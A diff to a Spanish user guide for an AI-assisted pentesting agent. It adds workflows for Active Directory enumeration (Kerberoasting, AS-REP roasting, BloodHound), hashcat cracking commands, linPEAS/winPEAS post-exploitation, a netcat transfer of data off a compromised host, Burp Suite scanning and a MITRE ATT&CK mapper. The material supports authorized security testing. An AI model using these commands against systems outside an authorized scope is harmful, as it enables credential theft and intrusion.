@@ -21,15 +21,19 @@
    - [Inicializar el mapa DLP](#44-inicializar-el-mapa-dlp)
    - [Reconocimiento](#45-reconocimiento)
    - [Analisis de vulnerabilidades](#46-analisis-de-vulnerabilidades)
-   - [Explotacion](#47-explotacion)
-   - [Cierre de sesion](#48-cierre-de-sesion)
-   - [Generar reporte](#49-generar-reporte)
+   - [Active Directory enumeration](#47-active-directory-enumeration)
+   - [Post-explotacion: linPEAS y winPEAS](#48-post-explotacion-linpeas-y-winpeas)
+   - [Web testing con Burp Suite](#49-web-testing-con-burp-suite)
+   - [Explotacion](#410-explotacion)
+   - [Cierre de sesion](#411-cierre-de-sesion)
+   - [Generar reporte](#412-generar-reporte)
 5. [Control DLP — uso avanzado](#5-control-dlp--uso-avanzado)
 6. [Live feed — seguir ejecucion autonoma](#6-live-feed--seguir-ejecucion-autonoma)
-7. [Modo conversacional](#7-modo-conversacional)
-8. [Referencia de comandos](#8-referencia-de-comandos)
-9. [Tips y buenas practicas](#9-tips-y-buenas-practicas)
-10. [Troubleshooting](#10-troubleshooting)
+7. [Modulo MITRE ATT&CK](#7-modulo-mitre-attck)
+8. [Modo conversacional](#8-modo-conversacional)
+9. [Referencia de comandos](#9-referencia-de-comandos)
+10. [Tips y buenas practicas](#10-tips-y-buenas-practicas)
+11. [Troubleshooting](#11-troubleshooting)
 
 ---
 
@@ -380,7 +384,200 @@ Herramientas que ejecuta:
 Hallazgos son pre-documentados automaticamente por el agente `doc-writer` en
 `findings/<engagement>/vulns/FIND-NNN_<titulo>.md` con formato CVSS 3.1.
 
-### 4.7 Explotacion
+### 4.7 Active Directory enumeration
+
+Modulo especifico para entornos Windows/AD. Ejecutar despues de `/vuln-scan` cuando
+se detectan puertos AD abiertos (88 Kerberos, 389 LDAP, 445 SMB, 636 LDAPS).
+
+#### Sin credenciales (null session / anonimo)
+
+```
+/ad-enum <ip_dc> <nombre_engagement> --anon
+```
+
+El agente verifica que el DC esta en `scope.md` y ejecuta:
+1. Fingerprint de puertos AD con nmap
+2. Enumeracion SMB/NetBIOS via enum4linux-ng (null session)
+3. Fingerprint con CrackMapExec / NetExec (deteccion de SMB signing)
+
+#### Con credenciales de dominio comprometidas
+
+```
+/ad-enum <ip_dc> <engagement> --user jdoe --pass Password123 --domain corp.local
+```
+
+Activa adicionalmente:
+- LDAP dump completo del dominio (ldapdomaindump): usuarios, grupos, computadoras, GPOs
+- Kerberoasting con `--kerberoast`: captura hashes TGS de cuentas con SPN
+- AS-REP Roasting con `--asreproast`: cuentas sin pre-autenticacion Kerberos
+- BloodHound collection con `--bloodhound`: genera ZIP para importar en la GUI
+
+#### Ejemplo de flujo completo AD
+
+```
+# Primera enumeracion (sin creds)
+/ad-enum 10.10.10.100 acme-corp-2026 --anon
+
+# Si SMB signing esta OFF y se obtienen creds por spray o fuerza bruta
+/ad-enum 10.10.10.100 acme-corp-2026 \
+    --user jdoe --pass Password123 --domain corp.local \
+    --bloodhound --kerberoast --asreproast
+
+# Si hay hashes Kerberos capturados, crackear offline:
+# hashcat -m 13100 findings/<eng>/recon/ad/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+# hashcat -m 18200 findings/<eng>/recon/ad/asreproast_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+#### Archivos generados
+
+```
+findings/<engagement>/recon/ad/
+|-- ports_ad.txt           <- puertos AD detectados por nmap
+|-- smb_enum.txt           <- output de enum4linux-ng (sanitizado en logs)
+|-- cme_smb.txt            <- fingerprint CME/NetExec con signing status
+|-- ldap/                  <- dump completo (ldapdomaindump)
+|   |-- domain_users.json
+|   |-- domain_computers.json
+|   |-- domain_groups.json
+|   `-- domain_policy.json
+|-- bloodhound/            <- ZIP para BloodHound GUI
+|   `-- <timestamp>_BloodHound.zip
+|-- kerberoast_hashes.txt  <- hashes TGS para crackeo offline
+`-- asreproast_hashes.txt  <- hashes AS-REP para crackeo offline
+```
+
+**Nota DLP**: todos los outputs son sanitizados antes de llegar al agente.
+Hostnames, IPs y nombres de usuarios del dominio se tokenizan automaticamente.
+
+#### Interpretar resultados criticos
+
+| Hallazgo | Tecnica ATT&CK | Siguiente paso |
+|----------|---------------|----------------|
+| SMB Signing disabled | T1557.001 | ntlmrelayx.py + Responder |
+| Cuentas Kerberoastable | T1558.003 | hashcat -m 13100 |
+| Cuentas AS-REP Roastable | T1558.004 | hashcat -m 18200 |
+| BloodHound ZIP generado | T1069.002 | Importar en GUI, query "Shortest Path to DA" |
+| Creds en LDAP / politicas | T1078.002 | Lateral movement / acceso directo |
+
+### 4.8 Post-explotacion: linPEAS y winPEAS
+
+Una vez con shell en el host comprometido, ejecutar linPEAS (Linux) o winPEAS (Windows)
+y transferir el output al directorio del engagement para analisis automatico.
+
+#### Ejecutar linPEAS en el host comprometido
+
+```bash
+# En el host comprometido (transferir el binario primero)
+./linpeas.sh > /tmp/linpeas_output.txt 2>&1
+
+# Transferir al entorno de trabajo (ejemplo via scp)
+scp usuario@host-comprometido:/tmp/linpeas_output.txt \
+    findings/2026-06-08_acme-corp-2026/post-exploitation/
+```
+
+#### Parsear el output automaticamente
+
+```
+/parse-privesc acme-corp-2026 findings/2026-06-08_acme-corp-2026/post-exploitation/linpeas_output.txt
+```
+
+El asistente:
+1. Detecta automaticamente si es linPEAS o winPEAS por el contenido
+2. Extrae y categoriza los vectores de escalacion de privilegios
+3. Genera `findings/<engagement>/post-exploitation/finding_privesc.md`
+4. Muestra severidad estimada y resumen de vectores
+
+#### Categorias que detecta el parser
+
+**linPEAS (Linux):**
+- Binarios SUID — referencia automatica a GTFOBins
+- Sudo misconfigurations (NOPASSWD, permisos excesivos)
+- Cron jobs con scripts escribibles
+- Credenciales en variables de entorno, archivos de config
+- Version del kernel — sugiere `searchsploit linux kernel <version>`
+- Archivos interesantes (id_rsa, .pem, .bak, config files)
+
+**winPEAS (Windows):**
+- AlwaysInstallElevated habilitado (vector de escalacion via MSI)
+- Credenciales de AutoLogon en el registro
+- Servicios con rutas sin comillas (Unquoted Service Path)
+- Servicios / binarios modificables por el usuario actual
+- Credenciales encontradas en archivos de configuracion
+
+#### Ejemplo de salida del parser
+
+```
+[PRIVESC] Analisis de linPEAS
+  Severidad estimada:  High
+  SUID binaries:       14
+  Sudo misconfig:      1
+  Cron jobs:           2
+  Credenciales:        3
+  Kernel:              5.4.0-42-generic
+
+  Ejecutar con --finding para generar finding_privesc.md
+```
+
+Despues de generar el finding, el agente agrega el mapping MITRE ATT&CK correspondiente
+y sugiere el siguiente paso de explotacion.
+
+### 4.9 Web testing con Burp Suite
+
+Integracion con la REST API de Burp Suite Professional. Requiere Burp Suite Pro
+corriendo localmente con la REST API habilitada (puerto 1337 por defecto).
+
+#### Configurar la API de Burp
+
+1. En Burp Suite Pro: `User options > Suite > REST API`
+2. Habilitar la API y copiar el API Key generado
+3. Setear la variable de entorno:
+   ```bash
+   export BURP_API_KEY="tu_api_key_aqui"
+   # O agregar a .env si usas Docker
+   ```
+
+#### Flujo tipico
+
+```
+# 1. Verificar conectividad
+/burp-scan status
+
+# 2. Iniciar scan (URL debe estar en scope.md)
+/burp-scan scan https://webapp.acme.com
+
+# Output: "Scan iniciado — Scan ID: 42"
+
+# 3. Monitorear progreso
+/burp-scan results 42
+
+# 4. Listar todos los scans
+/burp-scan list
+
+# 5. Exportar hallazgos al engagement
+/burp-scan findings 42 acme-corp-2026
+```
+
+#### Findings exportados
+
+Los hallazgos se guardan como `findings/<engagement>/vulns/finding_burp_NNN.md`
+con el formato estandar del proyecto:
+- Severidad Burp mapeada a Critical/High/Medium/Low
+- CVSS 3.1 estimado (ajustar manualmente con vector completo)
+- Tecnica MITRE ATT&CK mapeada automaticamente
+- Confianza del hallazgo (firm/tentative/certain)
+- Instancias afectadas (rutas del target, sanitizadas via DLP)
+
+#### Si Burp no esta disponible
+
+El asistente sugiere alternativas automaticamente:
+```
+[INFO] Burp Suite no detectado. Alternativas disponibles:
+  - /vuln-scan <target> -auto  (incluye Nikto + Nuclei + nmap NSE)
+  - nuclei -t web -severity critical,high -u <target>
+  - nikto -h <target>
+```
+
+### 4.10 Explotacion
 
 ```
 /exploit 192.168.10.50
@@ -400,7 +597,7 @@ Responde "si, ejecutar" para confirmar
 
 Si el operador escribe cualquier otra cosa, la ejecucion se cancela.
 
-### 4.8 Cierre de sesion
+### 4.11 Cierre de sesion
 
 ```
 /session-close acme-corp-2026
@@ -415,7 +612,7 @@ El asistente:
 
 Si hay multiples engagements activos y no se especifica nombre, el asistente pregunta.
 
-### 4.9 Generar reporte
+### 4.12 Generar reporte
 
 ```
 /report acme-corp-2026
@@ -424,18 +621,27 @@ Si hay multiples engagements activos y no se especifica nombre, el asistente pre
 Lee todos los archivos del engagement y genera `reports/acme-corp-2026_report_2026-06-08.md`:
 
 **Secciones del reporte:**
-1. Executive Summary — lenguaje no tecnico para gerencia
-2. Scope y metodologia
+1. Executive Summary — lenguaje no tecnico para gerencia, con distribucion de hallazgos por severidad
+2. Scope y metodologia (targets, tipo de prueba, herramientas)
 3. Hallazgos por severidad (Critical → Informational)
-   - Descripcion del hallazgo
+   - CVSS 3.1 score y vector string
+   - Tecnica MITRE ATT&CK mapeada
    - Evidencia (referencia a archivos, no contenido raw)
    - Impacto de negocio
    - Remediacion especifica con version/configuracion concreta
+   - Referencias a CVE, CWE y documentacion oficial
 4. Conclusiones y recomendaciones generales
+5. Roadmap de remediacion: inmediato / 30 dias / 90 dias
+
+**CVSS y MITRE en el reporte**: el agente calcula el CVSS 3.1 de cada finding basado
+en la descripcion y evidencia disponible, y mapea cada hallazgo a la tecnica ATT&CK
+correspondiente usando `tools/map-mitre.py`. Si algun score o tecnica no es preciso,
+el operador puede ajustarlo manualmente en el archivo generado.
 
 **Nota DLP sobre reportes**: el reporte usa tokens (TGT-001, HST-001). Antes de
 entregar al cliente, el operador reemplaza los tokens con los valores reales usando
-el `dlp-map.json` como referencia. Esto es intencional: mantiene el dato sensible
+el `dlp-map.json` como referencia. El agente muestra un recordatorio de este paso
+al terminar de generar el reporte. Esto es intencional: mantiene el dato sensible
 fuera del ciclo del agente hasta el momento de entrega.
 
 ---
@@ -608,7 +814,73 @@ El progreso hasta ese punto queda guardado en los archivos de findings y en el l
 
 ---
 
-## 7. Modo conversacional
+## 7. Modulo MITRE ATT&CK
+
+El proyecto incluye un mapeador de tecnicas MITRE ATT&CK integrado en todos los modulos.
+El archivo `tools/map-mitre.py` cubre 60+ tecnicas en 10 tacticas.
+
+### Uso desde la linea de comandos
+
+```bash
+# Buscar por keyword
+python3 tools/map-mitre.py "sql injection"
+python3 tools/map-mitre.py "kerberoasting"
+python3 tools/map-mitre.py "privilege escalation"
+python3 tools/map-mitre.py "suid"
+
+# Analizar un finding existente (detecta tecnicas en el contenido)
+python3 tools/map-mitre.py --finding findings/2026-06-08_acme/vulns/finding_001.md
+
+# Ver todas las tacticas cubiertas
+python3 tools/map-mitre.py --list-tactics
+
+# Output en JSON (para integraciones)
+python3 tools/map-mitre.py --json "lateral movement"
+```
+
+### Ejemplo de output
+
+```
+[MITRE ATT&CK] Tecnicas mapeadas (query: kerberoasting):
+
+  [1] T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
+       Tactica: Credential Access
+       Ref:     https://attack.mitre.org/techniques/T1558/003/
+```
+
+### Tacticas cubiertas
+
+| Tactica | Tecnicas incluidas (ejemplos) |
+|---------|-------------------------------|
+| Reconnaissance | Port scan, Subdomain enum, OSINT |
+| Initial Access | SQLi, RCE, LFI, SSRF, XXE, File Upload, Default Credentials |
+| Execution | PowerShell, Bash, WebShell, JavaScript (XSS) |
+| Persistence | Web Shell |
+| Privilege Escalation | SUID, Sudo, Cron, DLL Hijacking, Token Impersonation, LPE |
+| Credential Access | Brute Force, Kerberoasting, AS-REP Roasting, NTLM, Pass-the-Hash, LSASS |
+| Defense Evasion | Misconfiguration |
+| Discovery | Port/Service enum, SMB enum, LDAP/AD enum, BloodHound |
+| Lateral Movement | SMB, WinRM, Pass-the-Hash |
+| Exfiltration | C2 Channel |
+| Impact | Ransomware, DoS |
+
+### Integracion automatica
+
+El mapper se llama automaticamente en:
+- `/ad-enum` — mapea tecnicas AD (Kerberoasting, BloodHound, etc.)
+- `/parse-privesc` — mapea tecnicas de privesc por categoria (SUID, sudo, cron, etc.)
+- `/burp-scan findings` — mapea cada issue de Burp a su tecnica correspondiente
+- `/report` — incluye la tecnica en cada hallazgo del reporte final
+
+### Cuando un hallazgo no tiene mapeo automatico
+
+Si el mapper no encuentra coincidencia, el agente indica `T1190 — Exploit Public-Facing
+Application` como fallback generico para hallazgos web, y pide al operador que revise
+el mapping antes de incluirlo en el reporte final.
+
+---
+
+## 8. Modo conversacional
 
 No todos los problemas requieren un comando. El asistente entiende lenguaje natural
 y activa el agente `decision-advisor` cuando detecta que el operador necesita razonar,
@@ -654,7 +926,7 @@ Para CVEs incluye CVSS score, versiones afectadas y si hay exploit publico dispo
 
 ---
 
-## 8. Referencia de comandos
+## 9. Referencia de comandos
 
 ### Gestion de engagements
 
@@ -665,14 +937,44 @@ Para CVEs incluye CVSS score, versiones afectadas y si hay exploit publico dispo
 | `/status [nombre]` | Estado actual del engagement | `/status banco` |
 | `/session-close [nombre]` | Cierra sesion y hace commit | `/session-close banco-xyz` |
 
-### Pentesting
+### Pentesting — fases
 
 | Comando | Descripcion | Ejemplo |
 |---------|-------------|---------|
 | `/recon <target> [-auto]` | Reconocimiento completo | `/recon 10.10.10.5 -auto` |
 | `/vuln-scan <target> [-auto]` | Analisis de vulnerabilidades | `/vuln-scan webapp.com` |
 | `/exploit <target> [-auto]` | Vectores y explotacion | `/exploit 10.10.10.5` |
-| `/report <engagement>` | Reporte ejecutivo + tecnico | `/report banco-xyz` |
+| `/report <engagement>` | Reporte ejecutivo + tecnico con CVSS y MITRE | `/report banco-xyz` |
+
+### Active Directory
+
+| Comando | Descripcion | Ejemplo |
+|---------|-------------|---------|
+| `/ad-enum <dc> <eng>` | Enumeracion AD completa | `/ad-enum 10.10.10.100 acme` |
+| `/ad-enum ... --anon` | Sin credenciales (null session) | `/ad-enum 10.0.0.1 lab --anon` |
+| `/ad-enum ... --bloodhound` | Incluye BloodHound collection | `... --bloodhound` |
+| `/ad-enum ... --kerberoast` | Kerberoasting (requiere creds) | `... --kerberoast` |
+| `/ad-enum ... --asreproast` | AS-REP Roasting | `... --asreproast` |
+
+Flags completos de `/ad-enum`: `--user <u>`, `--pass <p>`, `--hash <nt>`, `--domain <d>`, `--dc-ip <ip>`
+
+### Post-explotacion
+
+| Comando | Descripcion | Ejemplo |
+|---------|-------------|---------|
+| `/parse-privesc <eng> <file>` | Parsea linPEAS/winPEAS y genera finding | `/parse-privesc acme linpeas.txt` |
+
+### Burp Suite
+
+| Comando | Descripcion | Ejemplo |
+|---------|-------------|---------|
+| `/burp-scan status` | Verifica conectividad con Burp | `/burp-scan status` |
+| `/burp-scan scan <url>` | Inicia scan activo | `/burp-scan scan https://app.com` |
+| `/burp-scan list` | Lista todos los scans | `/burp-scan list` |
+| `/burp-scan results <id>` | Estado y estadisticas del scan | `/burp-scan results 42` |
+| `/burp-scan findings <id> <eng>` | Exporta hallazgos al engagement | `/burp-scan findings 42 acme` |
+
+Variables de entorno para Burp: `BURP_HOST` (default: 127.0.0.1), `BURP_PORT` (default: 1337), `BURP_API_KEY` (requerida)
 
 ### Asistencia inteligente
 
@@ -686,13 +988,12 @@ Para CVEs incluye CVSS score, versiones afectadas y si hay exploit publico dispo
 
 | Comando | Descripcion |
 |---------|-------------|
-| `/check-tools` | Verifica herramientas instaladas; da comandos de instalacion para las que faltan |
+| `/check-tools` | Verifica herramientas instaladas (incluye AD tools y scripts del proyecto) |
 | `/help` | Menu general de comandos |
-| `/help <comando>` | Ayuda detallada de un comando especifico |
 
 ---
 
-## 9. Tips y buenas practicas
+## 10. Tips y buenas practicas
 
 ### Flujo diario optimo
 
@@ -700,10 +1001,13 @@ Para CVEs incluye CVSS score, versiones afectadas y si hay exploit publico dispo
 Inicio del dia:
   /morning-brief             <- ver estado de todos los engagements
 
-Trabajo:
+Trabajo (orden recomendado por fase):
   /recon <target> -auto      <- en segundo plano si es largo
-  /think <duda especifica>   <- cuando estes trabado
   /vuln-scan <target>        <- modo interactivo para revisar cada hallazgo
+  /ad-enum <dc> <eng>        <- si hay entorno Windows/AD en scope
+  /burp-scan scan <url>      <- si hay aplicacion web y Burp disponible
+  /parse-privesc <eng> <f>   <- despues de obtener shell y correr linPEAS/winPEAS
+  /think <duda especifica>   <- en cualquier momento, cuando estes trabado
 
 Fin del dia:
   /session-close             <- siempre cerrar antes de salir
@@ -777,6 +1081,46 @@ git commit -m "recon: nmap completo, 5 puertos abiertos"
 
 El `.gitignore` del engagement excluye pcaps, evidencias binarias, logs y el mapa DLP.
 
+### MITRE ATT&CK — uso como referencia rapida
+
+```bash
+# Buscar la tecnica para un hallazgo antes de documentarlo
+python3 tools/map-mitre.py "tipo_de_hallazgo"
+
+# Ver todas las tecnicas de una tactica especifica
+python3 tools/map-mitre.py --list-tactics
+
+# Verificar que el finding ya generado tiene la tecnica correcta
+python3 tools/map-mitre.py --finding findings/<eng>/vulns/finding_001.md
+```
+
+El mapper no reemplaza el criterio del operador — es un punto de partida. Siempre
+verificar la tecnica en https://attack.mitre.org antes de incluirla en el reporte final.
+
+### Active Directory — checklist pre-engagament
+
+Antes de ejecutar `/ad-enum`, verificar en `scope.md`:
+- IP del Domain Controller esta en la tabla de targets autorizados
+- Se especifica si el engagement incluye Kerberoasting o BloodHound
+- Se tiene el nombre del dominio (FQDN: corp.local, empresa.internal, etc.)
+
+Si se obtienen hashes Kerberos, ejecutar el crackeo offline fuera del contenedor
+si los recursos de CPU son limitados. Los archivos de hashes quedan en
+`findings/<engagement>/recon/ad/`.
+
+### linPEAS / winPEAS — transferencia al engagement
+
+```bash
+# Desde el host comprometido via nc
+nc -w 3 <tu_ip> 9999 < /tmp/linpeas.txt
+
+# Receptar en tu maquina
+nc -lvp 9999 > findings/<engagement>/post-exploitation/linpeas_output.txt
+
+# Luego parsear
+/parse-privesc <engagement> findings/<engagement>/post-exploitation/linpeas_output.txt
+```
+
 ### Docker — rebuild selectivo
 
 Si solo cambias archivos de comandos o CLAUDE.md, no hace falta rebuild:
@@ -790,7 +1134,7 @@ docker compose build --no-cache
 
 ---
 
-## 10. Troubleshooting
+## 11. Troubleshooting
 
 ### El agente no encuentra el engagement
 
@@ -872,6 +1216,86 @@ Solucion (en el host):
   chmod 755 findings/ reports/ logs/
   # O si el contenedor corre como root:
   sudo chown -R $USER:$USER findings/ reports/ logs/
+```
+
+### Herramientas AD no disponibles en modo nativo
+
+```
+Sintoma: [SKIP] enum4linux-ng no instalado
+Causa: las herramientas AD no estan en los repos oficiales de Arch/Manjaro
+
+Solucion:
+  pip install impacket ldapdomaindump bloodhound netexec enum4linux-ng
+
+  Para impacket con todos los scripts en PATH:
+  pip install impacket
+  # Los scripts quedan en ~/.local/bin/ o /usr/local/bin/
+  # Verificar: which GetUserSPNs.py
+
+  En Docker: las herramientas AD estan incluidas en la imagen (target lite y full).
+```
+
+### Burp API no responde
+
+```
+Sintoma: "/burp-scan status" falla con "Conexion fallida"
+Causas comunes:
+  - Burp Suite no esta corriendo
+  - La REST API no esta habilitada
+  - El puerto (default 1337) esta bloqueado o cambiado
+  - BURP_API_KEY no esta seteada o es incorrecta
+
+Verificar:
+  1. Burp Suite Pro corriendo: verificar en la barra de tareas
+  2. REST API habilitada: User options > Suite > REST API > Enable
+  3. Puerto correcto: User options > Suite > REST API > Port
+  4. API Key: copiar desde la misma ventana
+
+  Si Burp corre en otra maquina:
+    export BURP_HOST=<ip_de_burp>
+    /burp-scan status
+```
+
+### parse-privesc no detecta vectores
+
+```
+Sintoma: el parser retorna "severidad: Info" con 0 vectores detectados
+Causas comunes:
+  - El archivo tiene solo codigos ANSI sin texto legible (captura de terminal incompleta)
+  - El archivo es de una version muy antigua de linPEAS/winPEAS con formato diferente
+  - El archivo se llama igual pero es de otra herramienta
+
+Solucion:
+  # Verificar que el archivo tiene contenido legible
+  head -50 <archivo> | cat
+
+  # Ver output raw sin ANSI
+  cat -v <archivo> | head -50
+
+  # Si tiene ANSI, strip manual y reintentar
+  sed 's/\x1b\[[0-9;]*m//g' <archivo> > /tmp/linpeas_clean.txt
+  /parse-privesc <engagement> /tmp/linpeas_clean.txt
+```
+
+### ad-enum falla en BloodHound collection
+
+```
+Sintoma: [SKIP] BloodHound collection fallo
+Causas comunes:
+  - bloodhound-python no esta instalado (pip install bloodhound)
+  - Las credenciales son incorrectas o el usuario no tiene permisos suficientes
+  - El DC no acepta la conexion (firewall, SMB signing strict)
+  - El nombre de dominio es incorrecto (FQDN requerido)
+
+Solucion:
+  # Verificar instalacion
+  bloodhound-python --version
+
+  # Probar con dominio explicito
+  /ad-enum <dc> <eng> --user <u> --pass <p> --domain corp.local --dc-ip <ip> --bloodhound
+
+  # Si falla, intentar primero solo enum4linux-ng para confirmar conectividad
+  /ad-enum <dc> <eng> --anon
 ```
 
 ---
